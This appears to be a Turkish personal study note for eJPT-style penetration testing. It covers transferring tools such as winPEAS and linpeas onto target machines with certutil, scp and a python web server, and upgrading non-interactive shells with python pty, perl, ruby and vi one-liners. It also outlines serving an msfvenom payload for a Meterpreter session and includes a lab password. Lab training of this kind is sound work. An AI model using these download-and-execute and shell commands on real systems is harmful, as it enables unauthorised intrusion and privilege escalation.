### Bu script'i direk karşı tarafa tmp klasörüne atıp burada  çalıştıracağız.

![[Pasted image 20240416134811.png]]






---
![[Pasted image 20240416135143.png]]
![[Pasted image 20240416135159.png]]

![[Pasted image 20240416135219.png]]

![[Pasted image 20240416135402.png]]

![[Pasted image 20240416135418.png]]

![[Pasted image 20240416135445.png]]
![[Pasted image 20240416135510.png]]
![[Pasted image 20240416135522.png]]
![[Pasted image 20240416135534.png]]
![[Pasted image 20240416135558.png]]

![[Pasted image 20240416135610.png]]
![[Pasted image 20240416135622.png]]
![[Pasted image 20240416135644.png]]
![[Pasted image 20240416135654.png]]
![[Pasted image 20240416135707.png]]
![[Pasted image 20240416135718.png]]


![[Pasted image 20240416135734.png]]

---

## Transferring Files To Windows Targets - Linux Targets
#transfer 


### certutil
### wget
curl
### python3 http server
### scp  ---> Süpercopy 

---

## CERTUTIL
![[Pasted image 20240416230937.png]]
![[Pasted image 20240416231008.png]]
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil?ranMID=46131&ranEAID=a1LgFw09t88&ranSiteID=a1LgFw09t88-UeNI9_.dI9zq_Re_gMuc2A&epi=a1LgFw09t88-UeNI9_.dI9zq_Re_gMuc2A&irgwc=1&OCID=AIDcmm549zy227_aff_7806_1243925&tduid=(ir__kb9uyevjewkfdkotg1lmopsqpn2xdhyk2wq0130p00)(7806)(1243925)(a1LgFw09t88-UeNI9_.dI9zq_Re_gMuc2A)()&irclickid=_kb9uyevjewkfdkotg1lmopsqpn2xdhyk2wq0130p00

### Biz -URLCache parametresini kullanarak dosya aktarımını yapacağız.
![[Pasted image 20240416231423.png]]
##### <span style="background:#d4b106">certutil [options] -URLcache [URL | CRL | * [delete]]</span>


### Senaryoda biz hedef sisteme ![[Pasted image 20240416234024.png]]
### kali ismiyle erişim sağladık ama yetki yükseltmek için elimde yeterli veri yok. Winpeasx64.exe den yaralanacağım. eJPT klasörümde bu var bunu python3 http server ile yayınlayacağım certutil ile karşı taraftan çekeceğim.

![[Pasted image 20240416234233.png]]
![[Pasted image 20240416234320.png]]

### certutil -urlcache -f http://10.0.2.4/winPEASx64.exe winpeas.exe
![[Pasted image 20240416234545.png]]
#winPEAS 

### ./winpeas.exe -h    --->> help menu

https://www.youtube.com/watch?v=96k1eqc55jc

---

### #scp #super-copy 
![[Pasted image 20240417000656.png]]

### scp pivoting.elf admin@192.168.1.19:/tmp/

## password: metallica

![[Pasted image 20240417001515.png]]


### scp -p linpeas.sh vagrant@10.0.2.8:/home/vagrant
![[Pasted image 20240417002752.png]]
![[Pasted image 20240417002738.png]]

---

## Upgrading Non-Interactive Shells - Shell SPAWN

![[Pasted image 20240417112625.png]]

### Bazen exploit gerçekleşip shell aldığımızda interaktif bir shell görmemiş oluyoruz. Bunu daha stabil bizim yazdığımız komutları uygulayabilecek shell için spawn shell yapmalıyız.

## <span style="background:#ff4d4f">/bin/bash -i</span>
##### Bu shell spawn işlemini bash ile yaptığımızda hedef sistemde bash olduğunu biliyor farzederek yapıyorduk. Olmadığında aşağıdaki command'leri kullanacağız.
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
### Spawn shells
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

```
```


- `python -c 'import pty; pty.spawn("/bin/sh")'`
    
- `echo os.system('/bin/bash')`
    
- `/bin/sh -i`
    
- `script -qc /bin/bash /dev/null`
    
- `perl -e 'exec "/bin/sh";'`
    
- perl: `exec "/bin/sh";`
    
- ruby: `exec "/bin/sh"`
    
- lua: `os.execute('/bin/sh')`
    
- IRB: `exec "/bin/sh"`
    
- vi: `:!bash`
    
- vi: `:set shell=/bin/bash:shell`
    
- nmap: `!sh`
```

---

### Hedef sistemde hangi sheller var nasıl öğreneceğim ?

##### cat /etc/shells
![[Pasted image 20240417113424.png]]
![[Pasted image 20240417113456.png]]

### veya python var mı yok mu buna bakarak bu halledilebilir.
## which python
![[Pasted image 20240417113628.png]]
##### python -c 'import pty; pty.spawn("/bin/sh")'
![[Pasted image 20240417113719.png]]
##### python -c 'import pty; pty.spawn("/bin/bash")'

---

## NC ile shell aldık bunu stabil bir python shell'e çevirdik ama meterpreter shell lazım ne yapmalıyım ?
### hemen bir msfvenom'dan payload yaz bunu python3 -m http server ile yayınla ve hedef sistemden bunu çek
##### nc  /  scp  /  wget  /  certutil  /  web-browser  /   
## ve multi handler aç dinle hedefte payloadı execute et.

---

### Hedefte perl kurulu ise perl ile de shell alabilisin 
![[Pasted image 20240417114317.png]]
## <span style="background:#d4b106">perl: `exec "/bin/sh";`</span>

### perl -e 'exec "/bin/sh";'

### ruby -e 'exec "/bin/sh"'

---

## env --->>  Bu komut
![[Pasted image 20240417115319.png]]
### #export-PATH #path-export 
![[Pasted image 20240417115336.png]]
##### export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/









